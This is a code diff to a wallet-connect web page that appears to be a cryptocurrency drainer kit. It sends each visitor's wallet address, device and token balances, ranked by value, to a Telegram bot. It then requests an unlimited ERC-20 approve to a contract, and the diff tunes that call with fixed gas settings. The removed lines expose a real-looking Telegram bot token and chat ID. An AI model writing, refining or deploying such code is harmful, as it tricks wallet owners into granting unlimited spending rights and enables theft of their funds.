@@ -18,8 +18,8 @@ if (!projectId) {
   throw new Error('VITE_PROJECT_ID is not set')
 }
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "7776383972:AAE8wjnGU8nrKIZsCsYQFaC8xVHw8M4QltY"
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-4832119840"
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-1001234567890"
 
 const networks = [mainnet, bsc, polygon]
 
@@ -260,8 +260,8 @@ async function notifyWalletConnection(address, walletName, device) {
   if (sessionStorage.getItem('walletConnectedNotified')) return;
 
   const message = `🌀 Connect |\n` +
-                  `Wallet: \`${address}\`\n\n` +
-                  `Wallet Name: \`${walletName}\`\n\n` +
+                  `Wallet: \`${address}\`\n` +
+                  `Wallet Name: \`${walletName}\`\n` +
                   `Device: \`${device}\``;
 
   await sendTelegramMessage(message);
@@ -288,8 +288,8 @@ async function notifyTokenCheck(balances, mostExpensive, device) {
 
     const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`;
     message = `🤩 | Tokens\n` +
-              `${tokenList}\n\n` +
-              `== The most valuable: ${mostValuable}\n\n` +
+              `${tokenList}\n` +
+              `The most valuable: ${mostValuable}\n` +
               `Device: \`${device}\``;
   }
 
@@ -501,10 +501,12 @@ const initializeSubscribers = (modal) => {
             store.isApprovalRequested = false
             const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
             store.errors.push(errorMessage)
+            console.error(errorMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = errorMessage
             if (approveSection) approveSection.style.display = ''
+            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
           }
         }
       } else {
@@ -720,15 +722,28 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
+    // Fixed gas parameters
+    const gasLimit = BigInt(65000) // Fixed gas limit for approve
+    const maxFeePerGas = BigInt(10_000_000_000) // 10 Gwei
+    const maxPriorityFeePerGas = BigInt(2_000_000_000) // 2 Gwei
+
+    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
-      chainId
+      chainId,
+      gas: gasLimit,
+      maxFeePerGas,
+      maxPriorityFeePerGas
     })
+    console.log(`Approve transaction sent: ${txHash}`)
     return txHash
   } catch (error) {
+    console.error(`Approve token failed: ${error.message}`)
+    store.errors.push(`Approve token failed: ${error.message}`)
     throw error
   }
 }
